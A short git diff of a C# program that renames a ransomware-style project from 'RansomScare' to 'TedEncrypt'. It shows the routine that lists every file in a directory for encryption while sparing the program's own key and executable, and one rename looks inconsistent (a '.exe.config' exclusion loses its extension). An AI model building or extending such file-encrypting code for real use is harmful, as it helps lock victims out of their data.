@@ -7,7 +7,7 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
-namespace RansomScare
+namespace TedEncrypt
 {
     internal class Cryptography
     {
@@ -35,7 +35,7 @@ namespace RansomScare
 
 
         // Directory file scan function
-        // returns list of all files in the directory, excluding RansomScare's own
+        // returns list of all files in the directory, excluding TedEncrypt's own
         private List<string> ScanFiles()
         {
 
@@ -46,11 +46,11 @@ namespace RansomScare
 
             // Remove 'key' and executable to prevent encrypting them
             files.Remove(directory + "\\key");
-            files.Remove(directory + "\\RansomScare.exe");
+            files.Remove(directory + "\\TedEncrypt.exe");
 
             // Exclude .pdb and .exe.config for debug
-            files.Remove(directory + "\\RansomScare.exe.config");
-            files.Remove(directory + "\\RansomScare.pdb");
+            files.Remove(directory + "\\TedEncrypt");
+            files.Remove(directory + "\\TedEncrypt.pdb");
 
             return files;
         }
